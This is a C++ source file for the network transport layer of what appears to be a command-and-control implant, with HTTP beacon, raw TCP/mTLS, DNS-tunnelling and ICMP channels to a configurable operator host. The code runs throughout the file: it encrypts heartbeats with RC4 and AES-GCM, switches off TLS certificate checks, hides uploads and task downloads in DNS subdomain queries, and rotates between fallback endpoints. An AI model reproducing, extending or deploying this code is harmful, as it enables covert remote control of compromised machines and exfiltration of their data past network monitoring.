#include "agent.hpp"
#include "config.h"
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <poll.h>
#ifdef AGENT_WITH_DNS
#include <resolv.h>
#include <arpa/nameser.h>
#include <arpa/nameser_compat.h>
#endif
#include <netinet/ip_icmp.h>
#ifdef AGENT_WITH_OPENSSL
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif
#include "miniz.h"
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <algorithm>
#include <sstream>
#include <cctype>

static const size_t MAX_HTTP_RESPONSE = 64ULL * 1024ULL * 1024ULL;

static bytes transport_key(){
    bytes key = hex_decode(AGENT_ENC_KEY);
    if(key.empty()) key.assign(16, 0);
    return key;
}

static std::string cfg_host = AGENT_HOST;
static std::string cfg_port = AGENT_PORT;
static std::vector<std::string> cfg_hosts, cfg_ports;
static size_t endpoint_index = 0;
static bool endpoints_ready = false;

static void init_endpoints(){
    if(endpoints_ready) return;
    endpoints_ready = true;
    auto split = [](const std::string& src, char sep){
        std::vector<std::string> out;
        std::string cur;
        for(char c : src){
            if(c==sep){ if(!cur.empty()){ out.push_back(cur); cur.clear(); } }
            else cur.push_back(c);
        }
        if(!cur.empty()) out.push_back(cur);
        return out;
    };
    std::string hs=AGENT_HOSTS, ps=AGENT_PORTS;
    cfg_hosts = hs.empty() ? std::vector<std::string>{} : split(hs, ',');
    cfg_ports = ps.empty() ? std::vector<std::string>{} : split(ps, ',');
    if(cfg_hosts.empty()) cfg_hosts.push_back(cfg_host);
    if(cfg_ports.empty()) cfg_ports.push_back(cfg_port);
    while(cfg_ports.size() < cfg_hosts.size()) cfg_ports.push_back(cfg_ports.back().empty()?cfg_port:cfg_ports.back());
    while(cfg_hosts.size() < cfg_ports.size()) cfg_hosts.push_back(cfg_hosts.back().empty()?cfg_host:cfg_hosts.back());
}

static void next_endpoint(std::string& host, std::string& port){
    init_endpoints();
    if(cfg_hosts.empty()){ host=cfg_host; port=cfg_port; return; }
    host = cfg_hosts[endpoint_index % cfg_hosts.size()];
    port = cfg_ports[endpoint_index % cfg_ports.size()];
    endpoint_index = (endpoint_index + 1) % cfg_hosts.size();
}

static bool send_all(int fd, const uint8_t* p, size_t n){
    while(n>0){
        ssize_t w=send(fd,p,n,MSG_NOSIGNAL);
        if(w<0 && errno==EINTR) continue;
        if(w<=0) return false;
        p+=w; n-=(size_t)w;
    }
    return true;
}
static bool recv_all(int fd, uint8_t* p, size_t n){
    while(n>0){
        ssize_t r=recv(fd,p,n,0);
        if(r<0 && errno==EINTR) continue;
        if(r<=0) return false;
        p+=r; n-=(size_t)r;
    }
    return true;
}
static bool send_len_msg(int fd, const bytes& b){
    uint8_t h[4]={ (uint8_t)(b.size()>>24),(uint8_t)(b.size()>>16),(uint8_t)(b.size()>>8),(uint8_t)b.size() };
    return send_all(fd,h,4)&&(b.empty()||send_all(fd,b.data(),b.size()));
}
static bool recv_len_msg(int fd, bytes& out){
    uint8_t h[4]; if(!recv_all(fd,h,4)) return false;
    uint32_t n=((uint32_t)h[0]<<24)|((uint32_t)h[1]<<16)|((uint32_t)h[2]<<8)|h[3];
    if(n>64*1024*1024) return false;
    out.resize(n); if(n&&!recv_all(fd,out.data(),n)) return false;
    return true;
}

static bool set_socket_timeouts(int fd, int rcv_ms, int snd_ms){
    struct timeval tv;
    tv.tv_sec = rcv_ms/1000; tv.tv_usec = (rcv_ms%1000)*1000;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    tv.tv_sec = snd_ms/1000; tv.tv_usec = (snd_ms%1000)*1000;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    return true;
}

static std::string ascii_lower(const std::string& s){
    std::string out=s;
    for(char& c:out) c=(char)std::tolower((unsigned char)c);
    return out;
}

static std::string header_field(const std::string& headers, const std::string& name){
    size_t pos=0;
    while(pos<headers.size()){
        size_t eol=headers.find("\r\n",pos);
        if(eol==std::string::npos) eol=headers.size();
        std::string line=headers.substr(pos,eol-pos);
        pos=eol+2;
        size_t sep=line.find(':');
        if(sep==std::string::npos) continue;
        std::string key=line.substr(0,sep);
        std::string value=line.substr(sep+1);
        while(!value.empty() && value.front()==' ') value.erase(0,1);
        if(ascii_lower(key)==ascii_lower(name)) return value;
    }
    return "";
}

static bool decode_chunked_body(const bytes& raw, size_t start, bytes& out){
    size_t off=start;
    while(off<raw.size()){
        size_t line_end=off;
        while(line_end+1<raw.size() && !(raw[line_end]=='\r' && raw[line_end+1]=='\n')) line_end++;
        if(line_end+1>=raw.size()) return false;
        size_t size_end=off;
        while(size_end<line_end && raw[size_end]!=';') size_end++;
        std::string hexstr((const char*)raw.data()+off, size_end-off);
        char* end=nullptr;
        unsigned long long chunk=strtoull(hexstr.c_str(),&end,16);
        if(end==hexstr.c_str() || *end!='\0') return false;
        size_t data_start=line_end+2;
        if(chunk==0) return true;
        if((unsigned long long)(raw.size()-data_start) < chunk+2ULL) return false;
        out.insert(out.end(), raw.begin()+(std::ptrdiff_t)data_start, raw.begin()+(std::ptrdiff_t)(data_start+(size_t)chunk));
        off=data_start+(size_t)chunk+2;
    }
    return false;
}

static int tcp_connect(const std::string& host, const std::string& port, int timeout_ms=10000){
    struct addrinfo hints{},*res=nullptr; hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    if(getaddrinfo(host.c_str(),port.c_str(),&hints,&res)!=0) return -1;
    int fd=-1;
    for(auto ai=res;ai;ai=ai->ai_next){
        fd=socket(ai->ai_family,ai->ai_socktype,ai->ai_protocol); if(fd<0) continue;
        int flags=fcntl(fd,F_GETFL,0); fcntl(fd,F_SETFL,flags|O_NONBLOCK);
        int rc=connect(fd,ai->ai_addr,ai->ai_addrlen);
        if(rc!=0 && errno==EINPROGRESS){
            struct pollfd pfd{fd,POLLOUT,0};
            int pr;
            do { pr=poll(&pfd,1,timeout_ms); } while(pr<0 && errno==EINTR);
            if(pr<=0){ close(fd); fd=-1; continue; }
            int soerr=0; socklen_t slen=sizeof(soerr); getsockopt(fd,SOL_SOCKET,SO_ERROR,&soerr,&slen);
            if(soerr!=0){ close(fd); fd=-1; continue; }
        } else if(rc!=0){ close(fd); fd=-1; continue; }
        fcntl(fd,F_SETFL,flags);
        set_socket_timeouts(fd, 30000, 10000);
        break;
    }
    freeaddrinfo(res); return fd;
}

#ifdef AGENT_WITH_OPENSSL
static bool ssl_send_all(SSL* ssl, const uint8_t* p, size_t n){
    while(n>0){
        int w=SSL_write(ssl,p,(int)std::min<size_t>(n,INT_MAX));
        if(w<=0) return false;
        p+=w; n-=(size_t)w;
    }
    return true;
}
static bool ssl_recv_all(SSL* ssl, uint8_t* p, size_t n){
    while(n>0){
        int r=SSL_read(ssl,p,(int)std::min<size_t>(n,INT_MAX));
        if(r<=0) return false;
        p+=r; n-=(size_t)r;
    }
    return true;
}
static bool ssl_send_len_msg(SSL* ssl, const bytes& b){
    uint8_t h[4]={ (uint8_t)(b.size()>>24),(uint8_t)(b.size()>>16),(uint8_t)(b.size()>>8),(uint8_t)b.size() };
    return ssl_send_all(ssl,h,4)&&(b.empty()||ssl_send_all(ssl,b.data(),b.size()));
}
static bool ssl_recv_len_msg(SSL* ssl, bytes& out){
    uint8_t h[4]; if(!ssl_recv_all(ssl,h,4)) return false;
    uint32_t n=((uint32_t)h[0]<<24)|((uint32_t)h[1]<<16)|((uint32_t)h[2]<<8)|h[3];
    if(n>64*1024*1024) return false;
    out.resize(n); if(n&&!ssl_recv_all(ssl,out.data(),n)) return false;
    return true;
}
#endif

// ---------------------------------------------------------------------
// HTTP transport (BeaconHTTP-compatible)
// ---------------------------------------------------------------------
struct HttpTransport final : Transport {
    bytes raw_beat;
    bool use_ssl;
    bool needs_strip() const override { return true; }
    explicit HttpTransport(const bytes& beat){ raw_beat=beat; use_ssl=(std::string(AGENT_USE_SSL)=="true"); }
    bool exchange(const bytes& payload, bytes& out) override {
        std::string h,p; next_endpoint(h,p);
        int fd=tcp_connect(h,p); if(fd<0) return false;
#ifdef AGENT_WITH_OPENSSL
        SSL_CTX* ctx=nullptr; SSL* ssl=nullptr;
        if(use_ssl){
            SSL_library_init(); SSL_load_error_strings();
            ctx=SSL_CTX_new(TLS_client_method()); if(!ctx){close(fd);return false;}
            if(std::string(AGENT_TLS_CIPHERS).size()>0) SSL_CTX_set_cipher_list(ctx, AGENT_TLS_CIPHERS);
            SSL_CTX_set_verify(ctx,SSL_VERIFY_NONE,nullptr);
            ssl=SSL_new(ctx); SSL_set_fd(ssl,fd); SSL_set_tlsext_host_name(ssl, h.c_str());
            if(SSL_connect(ssl)!=1){ if(ssl)SSL_free(ssl); if(ctx)SSL_CTX_free(ctx); close(fd); return false; }
        }
#else
        if(use_ssl){ close(fd); return false; }
#endif
        std::string beat_b64;
        bytes b64=base64_encode(rc4_crypt(raw_beat, transport_key()));
        beat_b64.assign(b64.begin(),b64.end());
        std::string req="POST "+std::string(AGENT_URI)+" HTTP/1.1\r\n";
        std::string hosthdr = (h.find(':')!=std::string::npos) ? ("["+h+"]") : h;
        req+="Host: "+hosthdr+(p=="80"||p=="443"?"":":"+p)+"\r\n";
        req+="User-Agent: "+std::string(AGENT_USER_AGENT)+"\r\n";
        req+="Accept: */*\r\n";
        req+=std::string(AGENT_HB_HEADER)+": "+beat_b64+"\r\n";
        req+="Content-Type: application/octet-stream\r\n";
        req+="Content-Length: "+std::to_string(payload.size())+"\r\n";
        req+="Connection: close\r\n\r\n";
        bool ok;
#ifdef AGENT_WITH_OPENSSL
        if(ssl) ok=ssl_send_all(ssl,(uint8_t*)req.data(),req.size()) && (payload.empty()||ssl_send_all(ssl,payload.data(),payload.size()));
        else
#endif
        ok=send_all(fd,(uint8_t*)req.data(),req.size()) && (payload.empty()||send_all(fd,payload.data(),payload.size()));
        if(!ok){
#ifdef AGENT_WITH_OPENSSL
            if(ssl) SSL_free(ssl);
            if(ctx) SSL_CTX_free(ctx);
#endif
            close(fd);
            return false;
        }
        bytes resp;
        char buf[4096];
        bool too_large=false;
        while(true){
#ifdef AGENT_WITH_OPENSSL
            if(ssl){
                int r=SSL_read(ssl,buf,(int)sizeof(buf));
                if(r>0){
                    if(resp.size() + (size_t)r > MAX_HTTP_RESPONSE){ too_large=true; break; }
                    resp.insert(resp.end(),buf,buf+r); continue;
                }
                int e=SSL_get_error(ssl,r);
                if(e==SSL_ERROR_ZERO_RETURN) break;
                if(e==SSL_ERROR_WANT_READ || e==SSL_ERROR_WANT_WRITE) continue;
                break;
            } else
#endif
            {
                ssize_t r=recv(fd,buf,sizeof(buf),0);
                if(r>0){
                    if(resp.size() + (size_t)r > MAX_HTTP_RESPONSE){ too_large=true; break; }
                    resp.insert(resp.end(),buf,buf+r); continue;
                }
                if(r==0) break;
                if(errno==EINTR) continue;
                break;
            }
        }
#ifdef AGENT_WITH_OPENSSL
        if(ssl) SSL_free(ssl);
        if(ctx) SSL_CTX_free(ctx);
#endif
        close(fd);
        if(too_large) return false;
        static const std::string marker = "\r\n\r\n";
        auto pos=std::search(resp.begin(),resp.end(),marker.begin(),marker.end());
        if(pos==resp.end()) return false;
        size_t hlen=(size_t)(pos-resp.begin())+4;
        std::string headers(resp.begin(),resp.begin()+(std::ptrdiff_t)hlen);
        size_t sp1=headers.find(' '); if(sp1==std::string::npos) return false;
        size_t sp2=headers.find(' ',sp1+1); if(sp2==std::string::npos) sp2=headers.find("\r\n",sp1);
        if(sp2==std::string::npos) return false;
        std::string status_str=headers.substr(sp1+1,sp2-sp1-1);
        char* status_end=nullptr; errno=0;
        long status_long=strtol(status_str.c_str(),&status_end,10);
        if(errno!=0 || status_end==status_str.c_str() || *status_end!='\0') return false;
        int status=(int)status_long;
        if(status<200||status>=300) return false;
        std::string te=header_field(headers,"Transfer-Encoding");
        std::string cl=header_field(headers,"Content-Length");
        if(ascii_lower(te).find("chunked")!=std::string::npos){
            if(!decode_chunked_body(resp,hlen,out)) return false;
        } else if(!cl.empty()){
            char* end=nullptr; unsigned long long clv=strtoull(cl.c_str(),&end,10);
            if(end==cl.c_str() || *end!='\0' || clv>MAX_HTTP_RESPONSE) return false;
            if(resp.size() < hlen + (size_t)clv) return false;
            out.assign(resp.begin()+(std::ptrdiff_t)hlen, resp.begin()+(std::ptrdiff_t)(hlen+(size_t)clv));
        } else {
            out.assign(resp.begin()+(std::ptrdiff_t)hlen,resp.end());
        }
        return true;
    }
};

// ---------------------------------------------------------------------
// GopherTCP transport (raw TCP/mTLS, msgpack + AES-GCM)
// ---------------------------------------------------------------------
struct GopherTcpTransport final : Transport {
    bytes raw_beat; bytes session_key; int fd=-1;
#ifdef AGENT_WITH_OPENSSL
    SSL_CTX* ssl_ctx=nullptr; SSL* ssl=nullptr;
#endif
    bool use_tls=false;
    explicit GopherTcpTransport(const bytes& beat, const bytes& sk){ raw_beat=beat; session_key=sk; use_tls=(std::string(AGENT_TCP_USE_SSL)=="true"); }
    ~GopherTcpTransport(){ cleanup(); }
    void cleanup(){
#ifdef AGENT_WITH_OPENSSL
        if(ssl){ SSL_shutdown(ssl); SSL_free(ssl); ssl=nullptr; }
        if(ssl_ctx){ SSL_CTX_free(ssl_ctx); ssl_ctx=nullptr; }
#endif
        if(fd>=0){ close(fd); fd=-1; }
    }
    bool setup_tls(){
#ifdef AGENT_WITH_OPENSSL
        SSL_library_init(); SSL_load_error_strings();
        ssl_ctx=SSL_CTX_new(TLS_client_method()); if(!ssl_ctx) return false;
        if(std::string(AGENT_TLS_CIPHERS).size()>0) SSL_CTX_set_cipher_list(ssl_ctx, AGENT_TLS_CIPHERS);
        std::string cert=AGENT_TCP_CLIENT_CERT, key=AGENT_TCP_CLIENT_KEY, ca=AGENT_TCP_CA_CERT;
        if(!cert.empty()){
            BIO* bio=BIO_new_mem_buf(cert.data(),(int)cert.size());
            bool ok=false;
            if(bio){
                X509* x=PEM_read_bio_X509(bio,nullptr,nullptr,nullptr);
                if(x){ ok=(SSL_CTX_use_certificate(ssl_ctx,x)==1); X509_free(x); }
                BIO_free(bio);
            }
            if(!ok) return false;
        }
        if(!key.empty()){
            BIO* bio=BIO_new_mem_buf(key.data(),(int)key.size());
            bool ok=false;
            if(bio){
                EVP_PKEY* pkey=PEM_read_bio_PrivateKey(bio,nullptr,nullptr,nullptr);
                if(pkey){ ok=(SSL_CTX_use_PrivateKey(ssl_ctx,pkey)==1); EVP_PKEY_free(pkey); }
                BIO_free(bio);
            }
            if(!ok) return false;
        }
        if(!ca.empty()){
            BIO* bio=BIO_new_mem_buf(ca.data(),(int)ca.size());
            if(!bio) return false;
            X509_STORE* store=SSL_CTX_get_cert_store(ssl_ctx);
            X509* x=nullptr;
            while((x=PEM_read_bio_X509(bio,nullptr,nullptr,nullptr))!=nullptr){
                X509_STORE_add_cert(store,x); X509_free(x);
            }
            BIO_free(bio);
            SSL_CTX_set_verify(ssl_ctx,SSL_VERIFY_PEER,nullptr);
        } else {
            SSL_CTX_set_verify(ssl_ctx,SSL_VERIFY_NONE,nullptr);
        }
        ssl=SSL_new(ssl_ctx); if(!ssl) return false;
        SSL_set_fd(ssl,fd);
        if(SSL_connect(ssl)!=1) return false;
        return true;
#else
        (void)fd;
        return false;
#endif
    }
    bool connect_and_init(){
        cleanup();
        std::string h,p; next_endpoint(h,p);
        fd=tcp_connect(h,p); if(fd<0) return false;
        if(use_tls && !setup_tls()){ cleanup(); return false; }
        std::string banner=AGENT_TCP_BANNER;
        if(!banner.empty()){
            bytes b(banner.begin(),banner.end());
#ifdef AGENT_WITH_OPENSSL
            bool ok=ssl?ssl_recv_all(ssl,b.data(),b.size()):recv_all(fd,b.data(),b.size());
#else
            bool ok=recv_all(fd,b.data(),b.size());
#endif
            if(!ok){ cleanup(); return false; }
        }
        uint32_t agent_id=(uint32_t)raw_beat[4]<<24|(uint32_t)raw_beat[5]<<16|(uint32_t)raw_beat[6]<<8|raw_beat[7];
        bytes info(raw_beat.begin()+8,raw_beat.end());
        bytes init_pack=mp_map({{"id",mp_u64(agent_id)},{"type",mp_u64(0)},{"data",mp_bin(info)}});
        bytes start=mp_map({{"id",mp_i64(1)},{"data",mp_bin(init_pack)}});
        bytes enc=aes_gcm_encrypt(start,transport_key());
#ifdef AGENT_WITH_OPENSSL
        bool sent=ssl?ssl_send_len_msg(ssl,enc):send_len_msg(fd,enc);
#else
        bool sent=send_len_msg(fd,enc);
#endif
        if(enc.empty()||!sent){ cleanup(); return false; }
        return true;
    }
    bool exchange(const bytes& payload, bytes& out) override {
        if(fd<0 && !connect_and_init()) return false;
        bytes msg=payload;
#ifdef AGENT_WITH_OPENSSL
        bool ok=ssl?ssl_send_len_msg(ssl,msg):send_len_msg(fd,msg);
#else
        bool ok=send_len_msg(fd,msg);
#endif
        if(!ok){ cleanup(); return false; }
#ifdef AGENT_WITH_OPENSSL
        ok=ssl?ssl_recv_len_msg(ssl,out):recv_len_msg(fd,out);
#else
        ok=recv_len_msg(fd,out);
#endif
        if(!ok){ cleanup(); return false; }
        return true;
    }
};

#ifdef AGENT_WITH_DNS
// ---------------------------------------------------------------------
// DNS transport (BeaconDNS-compatible, msgpack carried over DNS)
// ---------------------------------------------------------------------
static uint32_t be32(const uint8_t* p){ return ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|((uint32_t)p[2]<<8)|p[3]; }
static void put_be32(bytes& b,uint32_t v){ b.push_back(v>>24); b.push_back(v>>16); b.push_back(v>>8); b.push_back(v); }
static uint32_t le32(const uint8_t* p){ return (uint32_t)p[0]|((uint32_t)p[1]<<8)|((uint32_t)p[2]<<16)|((uint32_t)p[3]<<24); }

static bool dns_query_txt(const std::string& qname, std::string& txt_out, std::string* a_ip=nullptr){
    static bool resolver_ready = [](){ res_init(); _res.retrans=1; _res.retry=2; return true; }();
    (void)resolver_ready;
    unsigned char answer[65536];
    int qtype = a_ip ? ns_t_a : ns_t_txt;
    int len=res_query(qname.c_str(), ns_c_in, qtype, answer, sizeof(answer));
    if(len<0) return false;
    ns_msg msg; if(ns_initparse(answer,len,&msg)<0) return false;
    txt_out.clear();
    int count=ns_msg_count(msg,ns_s_an);
    for(int i=0;i<count;i++){
        ns_rr rr; if(ns_parserr(&msg,ns_s_an,i,&rr)<0) continue;
        if(!a_ip && ns_rr_type(rr)==ns_t_txt){
            const unsigned char* d=ns_rr_rdata(rr); int n=ns_rr_rdlen(rr);
            int off=0;
            while(off<n){
                int slen=d[off++];
                if(slen<0 || off+slen>n) break;
                txt_out.append((const char*)d+off,slen);
                off+=slen;
            }
        } else if(a_ip && ns_rr_type(rr)==ns_t_a && ns_rr_rdlen(rr)>=4){
            const unsigned char* d=ns_rr_rdata(rr);
            char ip[32]; snprintf(ip,sizeof(ip),"%d.%d.%d.%d",d[0],d[1],d[2],d[3]); *a_ip=ip; break;
        }
    }
    return true;
}

static bool parse_dns_ack_ip(const std::string& a, bool& complete, uint32_t& next){
    struct in_addr in;
    if(inet_pton(AF_INET,a.c_str(),&in)!=1) return false;
    uint32_t v=ntohl(in.s_addr);
    complete = ((v>>24)&0x01)!=0;
    next = v & 0x00FFFFFFU;
    return true;
}

static std::string split_dns_label(const std::string& s){
    std::string out;
    for(size_t i=0;i<s.size();i+=48){
        if(i) out+='.';
        out.append(s,i,std::min<size_t>(48,s.size()-i));
    }
    return out;
}

struct DnsTransport final : Transport {
    bytes raw_beat; bytes dns_key; std::string domain; uint32_t sid; uint32_t agent_id;
    bytes down_buf; uint32_t down_total=0; uint32_t down_offset=0; uint32_t down_nonce=0; bool have_frame=false;
    std::vector<uint8_t> down_got;
    explicit DnsTransport(const bytes& beat){
        raw_beat=beat; dns_key=hex_decode(AGENT_DNS_ENC_KEY); domain=AGENT_DNS_DOMAIN;
        if(dns_key.empty()) dns_key.resize(16,0);
        agent_id=((uint32_t)beat[4]<<24)|((uint32_t)beat[5]<<16)|((uint32_t)beat[6]<<8)|beat[7];
        sid=agent_id;
        send_hi();
    }
    std::string sid_hex() const { char b[9]; snprintf(b,sizeof(b),"%08x",sid); return b; }
    size_t max_raw_chunk() const {
        for(size_t raw=200; raw>=8; raw--){
            size_t L=(raw*8+4)/5; // base32 chars without padding
            size_t extra=(L>0)?((L-1)/48):0;
            if(32 + domain.size() + L + extra <= 255) return raw;
        }
        return 8;
    }
    static std::string seq_hex(uint32_t v){ char b[9]; snprintf(b,sizeof(b),"%08x",v^0x39913991U); return b; }
    std::string make_qname(const std::string& op,uint32_t seq,const std::string& data_label){
        std::string q=sid_hex()+"."+op+"."+seq_hex(seq)+"."+seq_hex(0)+".";
        if(data_label.empty()) q+="x"; else q+=data_label;
        if(!domain.empty()) q+="."+domain;
        return q;
    }
    bool query_name(const std::string& q, std::string& txt, std::string* a=nullptr){
        if(dns_query_txt(q,txt,a)) return true;
        // one retry
        usleep(100000); return dns_query_txt(q,txt,a);
    }
    void send_hi(){
        bytes data; data.reserve(raw_beat.size());
        for(auto c:raw_beat) data.push_back(c);
        data=rc4_crypt(data,dns_key);
        std::string dl; for(auto c:base32_encode_nopad(data)) dl+=(char)c;
        std::string q=make_qname("hi",0,split_dns_label(dl)); std::string txt; query_name(q,txt);
    }
    bool upload_payload(const bytes& payload){
        // Frame: flags(0) + origLen LE + payload
        bytes frame; frame.push_back(0); frame.push_back((uint8_t)payload.size()); frame.push_back((uint8_t)(payload.size()>>8)); frame.push_back((uint8_t)(payload.size()>>16)); frame.push_back((uint8_t)(payload.size()>>24)); frame.insert(frame.end(),payload.begin(),payload.end());
        uint32_t total=(uint32_t)frame.size();
        size_t max_raw=max_raw_chunk(); if(max_raw<=16) return false;
        const size_t chunk=max_raw-16;
        for(uint32_t off=0;off<total;off+=(uint32_t)chunk){
            size_t n=std::min<size_t>(chunk,total-off);
            bytes raw; raw.reserve(8+8+n);
            raw.push_back(1); raw.push_back(0); raw.push_back(0); raw.push_back(0); // meta version=1 flags=0 reserved
            uint32_t ack=down_total; raw.push_back(ack); raw.push_back(ack>>8); raw.push_back(ack>>16); raw.push_back(ack>>24); // downAckOffset LE
            put_be32(raw,total); put_be32(raw,off);
            raw.insert(raw.end(),frame.begin()+off,frame.begin()+off+n);
            bytes enc=rc4_crypt(raw,dns_key);
            std::string dl; for(auto c:base32_encode_nopad(enc)) dl+=(char)c;
            std::string q=make_qname("put",0,split_dns_label(dl));
            bool chunk_done=false;
            for(int attempt=0; attempt<3 && !chunk_done; attempt++){
                std::string txt,a;
                if(!query_name(q,txt,&a)) return false;
                bool complete=false; uint32_t next=0;
                if(!a.empty() && parse_dns_ack_ip(a,complete,next)){
                    if(complete || next>=off+(uint32_t)n) chunk_done=true;
                } else {
                    chunk_done=true; // no A ack available; assume accepted
                }
                if(!chunk_done) usleep(50000);
            }
            if(!chunk_done) return false;
        }
        return true;
    }
    int poll_hb(){
        bytes hb(12,0); put_be32(hb,down_total); /* ack offset */
        // taskNonce must be big-endian: the DNS listener reads decrypted[8:12]
        // with binary.BigEndian.Uint32 (beacon_listener_dns/pl_transport.go).
        uint32_t nonce=down_nonce; hb[8]=nonce>>24; hb[9]=nonce>>16; hb[10]=nonce>>8; hb[11]=nonce;
        bytes enc=rc4_crypt(hb,dns_key);
        std::string dl; for(auto c:base32_encode_nopad(enc)) dl+=(char)c;
        std::string q=make_qname("hb",0,split_dns_label(dl)); std::string txt,a; if(!query_name(q,txt,&a)) return -1;
        if(!a.empty()){
            struct in_addr in; if(inet_pton(AF_INET,a.c_str(),&in)==1){
                uint32_t v=ntohl(in.s_addr); uint8_t flags=(uint8_t)(v>>24);
                if(flags&0x02) return 2;
                if(flags&0x01) return 1;
            }
        }
        return 0;
    }
    bool get_chunk(){
        bytes req; put_be32(req,down_offset); bytes enc=rc4_crypt(req,dns_key);
        std::string dl; for(auto c:base32_encode_nopad(enc)) dl+=(char)c;
        std::string q=make_qname("get",0,split_dns_label(dl)); std::string txt; if(!query_name(q,txt)) return false;
        bytes b64(txt.begin(),txt.end()); bytes dec; base64_decode(txt,dec); dec=rc4_crypt(dec,dns_key);
        if(dec.size()<8) return false;
        uint32_t total=be32(&dec[0]); uint32_t off=be32(&dec[4]); bytes chunk(dec.begin()+8,dec.end());
        if(total==0 || total>4*1024*1024) return false;
        if(total!=down_total){ down_total=total; down_offset=0; down_buf.assign(total,0); down_got.assign(total,0); have_frame=false; }
        if(off+chunk.size()<=down_total){
            memcpy(down_buf.data()+off,chunk.data(),chunk.size());
            for(size_t i=0;i<chunk.size();i++) down_got[off+i]=1;
            while(down_offset<down_total && down_got[down_offset]) down_offset++;
        }
        return true;
    }
    bool exchange(const bytes& payload, bytes& out) override {
        if(!payload.empty()){ if(!upload_payload(payload)) return false; }
        int pending=0;
        for(int i=0;i<3;i++){ pending=poll_hb(); if(pending==1||pending==2) break; usleep(100000); }
        if(pending<=0){ out.clear(); return true; }
        if(pending==2){ down_total=0; down_offset=0; down_buf.clear(); down_got.clear(); down_nonce=0; have_frame=false; out.clear(); return true; }
        down_total=0; down_offset=0; down_buf.clear(); down_got.clear(); have_frame=false;
        // first chunk initializes total
        if(!get_chunk()) return true;
        int guard=0;
        while(down_offset<down_total && guard++<2000){ if(!get_chunk()) break; }
        if(down_total==0||down_offset<down_total){ out.clear(); return true; }
        // Parse task frame header: flags + nonce + origLen + payload
        if(down_buf.size()<9){ out.clear(); return true; }
        uint8_t flags=down_buf[0]; uint32_t nonce=le32(&down_buf[1]); uint32_t orig=le32(&down_buf[5]);
        bytes body(down_buf.begin()+9,down_buf.end());
        if(flags&1){ if(orig>16*1024*1024){ out.clear(); return true; } bytes tmp(orig); mz_ulong dest=orig; if(mz_uncompress(tmp.data(),&dest,body.data(),body.size())==MZ_OK) body.assign(tmp.begin(),tmp.begin()+dest); }
        down_nonce=nonce; down_total=down_buf.size(); // ack full task
        out=body; return true;
    }
};
#endif

// ---------------------------------------------------------------------
// ICMP transport (client-side raw ICMP; requires a custom server listener)
// ---------------------------------------------------------------------
struct IcmpTransport final : Transport {
    bytes raw_beat; int fd=-1;
    explicit IcmpTransport(const bytes& beat) : raw_beat(beat) {}
    ~IcmpTransport(){ if(fd>=0) close(fd); }
    bool exchange(const bytes& payload, bytes& out) override {
        // Raw ICMP echo carrying the encrypted msgpack payload. The matching
        // server listener must echo back task data in the ICMP payload.
        if(fd<0){
            fd=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP); if(fd<0) return false;
            struct timeval tv{3,0}; setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
        }
        struct sockaddr_in dst{}; dst.sin_family=AF_INET; dst.sin_port=0;
        struct hostent* h=gethostbyname(cfg_host.c_str()); if(!h) return false;
        memcpy(&dst.sin_addr,h->h_addr,4);
        size_t n=std::min<size_t>(payload.size(),1400);
        bytes pkt(8+n,0); pkt[0]=8; pkt[4]=(uint8_t)(getpid()>>8); pkt[5]=(uint8_t)getpid();
        if(n) memcpy(pkt.data()+8,payload.data(),n);
        uint16_t cksum=0; uint32_t sum=0; for(size_t i=0;i<pkt.size();i+=2){ uint16_t w=(uint16_t)((pkt[i]<<8)|((i+1<pkt.size())?pkt[i+1]:0)); sum+=w; } while(sum>>16) sum=(sum&0xffff)+(sum>>16); cksum=(uint16_t)~sum;
        pkt[2]=(uint8_t)(cksum>>8); pkt[3]=(uint8_t)cksum;
        if(sendto(fd,pkt.data(),pkt.size(),0,(sockaddr*)&dst,sizeof(dst))<0) return false;
        uint8_t buf[65536]; sockaddr_in src{}; socklen_t sl=sizeof(src);
        ssize_t r=recvfrom(fd,buf,sizeof(buf),0,(sockaddr*)&src,&sl); if(r<=8) return false;
        out.assign(buf+8,buf+r); return true;
    }
};

std::unique_ptr<Transport> make_transport(const bytes& beat, const bytes& session_key){
    std::string t=AGENT_TRANSPORT;
    if(t=="http") return std::make_unique<HttpTransport>(beat);
    if(t=="tcp"||t=="gopher"||t=="gophertcp") return std::make_unique<GopherTcpTransport>(beat,session_key);
#ifdef AGENT_WITH_DNS
    if(t=="dns") return std::make_unique<DnsTransport>(beat);
#endif
    if(t=="icmp") return std::make_unique<IcmpTransport>(beat);
    return std::make_unique<HttpTransport>(beat);
}
